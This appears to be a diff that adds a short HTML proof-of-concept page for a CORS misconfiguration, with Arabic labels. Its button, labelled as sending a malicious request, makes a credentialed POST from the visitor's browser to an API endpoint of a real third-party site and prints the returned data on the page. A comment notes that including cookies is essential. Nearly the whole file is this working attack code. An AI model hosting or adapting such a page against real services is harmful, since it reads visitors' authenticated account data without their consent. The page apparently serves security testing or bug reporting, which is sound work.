@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>CORS Testing POC</h1>
+    <button onclick="exploit()">إرسال الطلب الخبيث</button>
+    <pre id="output"></pre>
+    <script>
+        function exploit() {
+            fetch('https://eu.pftk.temu.com/pmm/api/pmm/defined', {
+                method: 'POST',
+                credentials: 'include', // ضروري جداً لإرسال الـ Cookies
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('output').innerText = JSON.stringify(data, null, 2);
+                console.log(data);
+            })
+            .catch(error => {
+                document.getElementById('output').innerText = "فشل الطلب: " + error;
+            });
+        }
+    </script>
+</body>
+</html>
